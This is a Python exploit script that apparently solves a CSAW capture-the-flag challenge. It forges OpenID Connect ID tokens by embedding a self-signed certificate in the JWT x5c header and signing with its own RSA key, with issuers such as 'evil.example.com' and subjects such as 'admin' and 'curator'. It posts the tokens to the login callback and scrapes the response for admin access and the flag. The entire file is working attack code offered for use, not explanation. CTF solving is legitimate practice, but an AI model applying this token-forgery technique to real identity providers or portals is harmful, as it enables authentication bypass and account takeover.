import base64,json,datetime,requests,sys,re
from cryptography.hazmat.primitives.asymmetric import rsa,padding
from cryptography.hazmat.primitives import hashes,serialization
from cryptography import x509
from cryptography.x509.oid import NameOID
B="https://dino2auth.ctf.csaw.io"; CB=f"{B}/oauth/callback"
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
key=rsa.generate_private_key(public_exponent=65537,key_size=2048)
def mk(iss,sub,hdr_extra=None,cn=None):
    cn=cn or iss
    name=x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,cn)])
    cert=(x509.CertificateBuilder().subject_name(name).issuer_name(name)
        .public_key(key.public_key()).serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime(2026,1,1)).not_valid_after(datetime.datetime(2027,1,1))
        .sign(key,hashes.SHA256()))
    der=cert.public_bytes(serialization.Encoding.DER)
    header={"alg":"RS256","typ":"JWT","x5c":[base64.b64encode(der).decode()]}
    if hdr_extra: header.update(hdr_extra)
    payload={"iss":iss,"sub":sub,"aud":"trustdinoidc-portal","scope":"openid profile freeosaurus:redeem","exp":1900000000}
    signing=f"{b64u(json.dumps(header))}.{b64u(json.dumps(payload))}"
    sig=key.sign(signing.encode(),padding.PKCS1v15(),hashes.SHA256())
    return f"{signing}.{b64u(sig)}"
def test(iss,sub,**kw):
    t=mk(iss,sub,**kw)
    s=requests.Session()
    r=s.post(CB,data={"id_token":t,"state":"x"},allow_redirects=False)
    if r.status_code not in (302,303):
        print(f"iss={iss!r} sub={sub!r} -> {r.status_code} REJECT"); return
    h=s.get(f"{B}/").text
    tier=re.search(r'tier tier-(\w+)">([^<]+)<',h); via=re.search(r'nav-link">([^<]*via[^<]*)<',h)
    flag=re.search(r'csawctf\{[^}]+\}',h)
    print(f"iss={iss!r} sub={sub!r} -> {r.status_code} tier={tier.groups() if tier else None} via={via.group(1).strip() if via else None} admin={'Not an admin' not in h} FLAG={flag.group() if flag else None}")
tests=[("evil.example.com","guest"),("evil.example.com","admin"),("evil.example.com","curator"),
       ("paleoid.example.com","admin"),("paleoid.example.com","curator")]
for iss,sub in tests: test(iss,sub)
